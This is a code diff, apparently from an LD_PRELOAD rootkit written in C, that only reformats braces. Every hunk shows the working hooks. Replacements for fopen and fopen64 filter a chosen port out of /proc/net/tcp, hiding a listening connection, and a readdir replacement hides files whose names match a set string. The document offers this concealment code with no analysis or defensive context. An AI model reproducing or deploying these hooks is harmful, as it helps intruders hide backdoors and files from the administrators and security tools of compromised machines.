@@ -86,28 +86,25 @@ ssize_t write(int fd, const void *buf, size_t count){
 }
 
 FILE *(*orig_fopen64)(const char *pathname, const char *mode);
-FILE *fopen64(const char *pathname, const char *mode)
-{
+FILE *fopen64(const char *pathname, const char *mode){
+	
 	orig_fopen64 = dlsym(RTLD_NEXT, "fopen64");
 
 	char *ptr_tcp = strstr(pathname, "/proc/net/tcp");
 
 	FILE *fp;
 
-	if (ptr_tcp != NULL)
-	{
+	if (ptr_tcp != NULL){
+		
 		char line[256];
 		FILE *temp = tmpfile64();
 		fp = orig_fopen64(pathname, mode);
-		while (fgets(line, sizeof(line), fp))
-		{
+		while (fgets(line, sizeof(line), fp)){
 			char *listener = strstr(line, HEX_PORT);
-			if (listener != NULL)
-			{
+			if (listener != NULL){
 				continue;
 			}
-			else
-			{
+			else{
 				fputs(line, temp);
 			}
 		}
@@ -119,24 +116,23 @@ FILE *fopen64(const char *pathname, const char *mode)
 }
 
 FILE *(*orig_fopen)(const char *pathname, const char *mode);
-FILE *fopen(const char *pathname, const char *mode)
-{
+FILE *fopen(const char *pathname, const char *mode){
+	
 	orig_fopen = dlsym(RTLD_NEXT, "fopen");
 
 	char *ptr_tcp = strstr(pathname, "/proc/net/tcp");
 
 	FILE *fp;
 
-	if (ptr_tcp != NULL)
-	{
+	if (ptr_tcp != NULL){
+		
 		char line[256];
 		FILE *temp = tmpfile();
 		fp = orig_fopen(pathname, mode);
-		while (fgets(line, sizeof(line), fp))
-		{
+		while (fgets(line, sizeof(line), fp)){
+			
 			char *listener = strstr(line, HEX_PORT);
-			if (listener != NULL)
-			{
+			if (listener != NULL){
 				continue;
 			}
 			else
@@ -153,14 +149,14 @@ FILE *fopen(const char *pathname, const char *mode)
 }
 
 struct dirent *(*old_readdir)(DIR *dir);
-struct dirent *readdir(DIR *dirp)
-{
+struct dirent *readdir(DIR *dirp){
+	
     old_readdir = dlsym(RTLD_NEXT, "readdir");
 
     struct dirent *dir;
 
-    while (dir = old_readdir(dirp))
-    {
+    while (dir = old_readdir(dirp)){
+	    
         if(strstr(dir->d_name,FILENAME) == 0) break;
     }
     return dir;
